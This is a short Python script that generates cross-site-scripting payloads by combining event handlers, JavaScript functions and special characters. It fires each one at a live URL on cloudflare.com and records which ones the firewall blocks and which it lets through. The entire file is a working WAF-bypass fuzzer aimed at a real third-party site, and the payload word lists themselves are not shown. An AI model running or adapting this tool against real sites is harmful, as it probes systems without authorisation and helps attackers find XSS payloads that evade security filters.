import requests
import urllib.parse
from itertools import product

def load_list_from_file(filename):
    with open(filename, 'r') as f:
        return [line.strip() for line in f if line.strip()]

def generate_payloads(events, funcs, chars):
    for event, func, char in product(events, funcs, chars):
        yield f'{char} {event}={func} {char}'

def test_payloads_on_cloudflare(payloads, base_url="https://www.cloudflare.com/?xss="):
    blocked = []
    allowed = []

    headers = {
        "User-Agent": "Mozilla/5.0 (XSS-Fuzzer)"
    }

    for payload in payloads:
        encoded_payload = urllib.parse.quote(payload)
        test_url = base_url + encoded_payload
        try:
            response = requests.get(test_url, headers=headers, timeout=5)

            if response.status_code == 403:
                print(f"❌ Blocked (403): {payload}")
                blocked.append(payload)
            else:
                print(f"✅ Allowed ({response.status_code}): {payload}")
                allowed.append(payload)

        except requests.exceptions.RequestException as e:
            print(f"[!] Error for payload '{payload}': {e}")
            blocked.append(payload)

    return allowed, blocked

def main():
    events = load_list_from_file("event_handlers.txt")
    funcs = load_list_from_file("functions.txt")
    chars = load_list_from_file("special_chars.txt")

    print(f"[*] Generating and testing payloads on Cloudflare...")

    payloads = list(generate_payloads(events, funcs, chars))
    allowed, blocked = test_payloads_on_cloudflare(payloads)

    print("\n✅ Allowed Payloads:")
    for p in allowed:
        print(f"  -> {p}")

    print("\n❌ Blocked Payloads (403):")
    for p in blocked:
        print(f"  -> {p}")

if __name__ == "__main__":
    main()
